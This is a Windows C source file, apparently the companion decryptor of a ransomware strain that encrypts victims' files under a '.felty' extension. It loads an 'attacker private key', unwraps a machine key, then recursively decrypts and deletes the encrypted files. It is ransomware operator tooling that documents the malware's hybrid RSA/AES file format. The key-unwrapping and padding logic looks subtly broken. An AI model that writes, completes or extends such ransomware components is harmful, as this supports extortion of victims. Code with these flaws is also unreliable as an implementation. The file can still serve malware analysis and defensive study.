#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#define AES_KEY_SIZE    32
#define AES_BLOCK_SIZE  16
#define ENC_EXT         L".felty"

static HCRYPTPROV g_prov = 0;

static int read_file(const wchar_t *p, BYTE **out, DWORD *len) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(h); return 0; }
    *out = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!*out) { CloseHandle(h); return 0; }
    DWORD rd = 0;
    if (!ReadFile(h, *out, sz, &rd, NULL) || rd != sz) {
        VirtualFree(*out, 0, MEM_RELEASE);
        CloseHandle(h);
        return 0;
    }
    CloseHandle(h);
    *len = sz;
    return 1;
}

static int write_file(const wchar_t *p, BYTE *d, DWORD len) {
    HANDLE h = CreateFileW(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD w = 0;
    int r = WriteFile(h, d, len, &w, NULL) && w == len;
    CloseHandle(h);
    return r;
}

static HCRYPTKEY import_key_pem(const wchar_t *path) {
    BYTE *data = NULL;
    DWORD len = 0;
    if (!read_file(path, &data, &len)) return 0;
    char *b = strstr((char*)data, "-----BEGIN");
    if (!b) { VirtualFree(data, 0, MEM_RELEASE); return 0; }
    char *s = strchr(b, '\n');
    if (!s) { VirtualFree(data, 0, MEM_RELEASE); return 0; }
    s++;
    BYTE der[8192];
    DWORD der_len = sizeof(der);
    if (!CryptStringToBinaryA(s, 0, CRYPT_STRING_BASE64, der, &der_len, NULL, NULL)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }
    VirtualFree(data, 0, MEM_RELEASE);
    HCRYPTKEY key = 0;
    if (!CryptImportKey(g_prov, der, der_len, 0, 0, &key)) return 0;
    return key;
}

static int decrypt_one(const wchar_t *path, HCRYPTKEY vkey) {
    BYTE *data = NULL;
    DWORD size = 0;
    if (!read_file(path, &data, &size)) return 0;
    if (size < 24) { VirtualFree(data, 0, MEM_RELEASE); return 0; }
    DWORD off = 0;
    DWORD klen = *(DWORD*)(data+off); off += 4;
    if (off + klen + 16 > size) { VirtualFree(data, 0, MEM_RELEASE); return 0; }
    BYTE *ek = data+off; off += klen;
    BYTE *iv = data+off; off += 16;
    BYTE *ct = data+off;
    DWORD ct_len = size - off;
    DWORD al = 32;
    BYTE ak[32];
    memcpy(ak, ek, 32);
    if (!CryptDecrypt(vkey, 0, TRUE, 0, ak, &al)) {
        VirtualFree(data, 0, MEM_RELEASE); return 0;
    }
    struct {
        BLOBHEADER hdr;
        DWORD len;
        BYTE key[32];
    } blob;
    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_AES_256;
    blob.len = 32;
    memcpy(blob.key, ak, 32);
    HCRYPTKEY ah = 0;
    if (!CryptImportKey(g_prov, (BYTE*)&blob, sizeof(blob), 0, 0, &ah)) {
        VirtualFree(data, 0, MEM_RELEASE); return 0;
    }
    CryptSetKeyParam(ah, KP_IV, iv, 0);
    DWORD pt_len = ct_len;
    if (!CryptDecrypt(ah, 0, TRUE, 0, ct, &pt_len)) {
        CryptDestroyKey(ah); VirtualFree(data, 0, MEM_RELEASE); return 0;
    }
    CryptDestroyKey(ah);
    BYTE pad = ct[pt_len-1];
    if (pad && pad <= 16) pt_len -= pad;
    wchar_t out[MAX_PATH];
    wcscpy(out, path);
    size_t plen = wcslen(out);
    if (plen >= 6) out[plen-6] = 0;
    int r = write_file(out, ct, pt_len);
    VirtualFree(data, 0, MEM_RELEASE);
    if (r) DeleteFileW(path);
    return r;
}

static void walk_decrypt(const wchar_t *dir, HCRYPTKEY key, int *count) {
    wchar_t s[MAX_PATH];
    wcscpy(s, dir); wcscat(s, L"\\*");
    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(s, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.cFileName[0]==L'.') continue;
            if (!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L"..")) continue;
            wchar_t sub[MAX_PATH];
            wcscpy(sub, dir); wcscat(sub, L"\\"); wcscat(sub, fd.cFileName);
            walk_decrypt(sub, key, count);
        } else {
            const wchar_t *e = wcsrchr(fd.cFileName, L'.');
            if (e && !_wcsicmp(e, ENC_EXT)) {
                wchar_t fp[MAX_PATH];
                wcscpy(fp, dir); wcscat(fp, L"\\"); wcscat(fp, fd.cFileName);
                wprintf(L"[%d] %s\n", *count+1, fp);
                if (decrypt_one(fp, key)) { (*count)++; wprintf(L"OK\n"); }
                else wprintf(L"FAILED\n");
            }
        }
    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc < 3) {
        wprintf(L"Usage: felty_decrypt.exe <private.pem> <directory>\n");
        return 1;
    }
    if (!CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0)) {
        wprintf(L"Crypto init failed\n");
        return 1;
    }
    HCRYPTKEY ak = import_key_pem(argv[1]);
    if (!ak) { wprintf(L"Failed to load key: %s\n", argv[1]); return 1; }
    wprintf(L"[+] Loaded attacker private key\n");
    wchar_t ekp[MAX_PATH];
    wcscpy(ekp, argv[2]);
    size_t dl = wcslen(ekp);
    if (dl>0 && ekp[dl-1]==L'\\') ekp[dl-1]=0;
    wcscat(ekp, L"\\machine.eky");
    HCRYPTKEY vk = 0;
    BYTE *ed = NULL; DWORD el = 0;
    if (read_file(ekp, &ed, &el)) {
        if (CryptImportKey(g_prov, ed, el, ak, 0, &vk))
            wprintf(L"[+] Loaded machine.eky\n");
        VirtualFree(ed, 0, MEM_RELEASE);
    }
    if (!vk) { wprintf(L"[-] No machine.eky, using attacker key\n"); vk = ak; }
    int count = 0;
    wprintf(L"[*] Scanning: %s\n", argv[2]);
    walk_decrypt(argv[2], vk, &count);
    wprintf(L"[+] Decrypted %d files\n", count);
    if (vk != ak) CryptDestroyKey(vk);
    CryptDestroyKey(ak);
    CryptReleaseContext(g_prov, 0);
    return 0;
}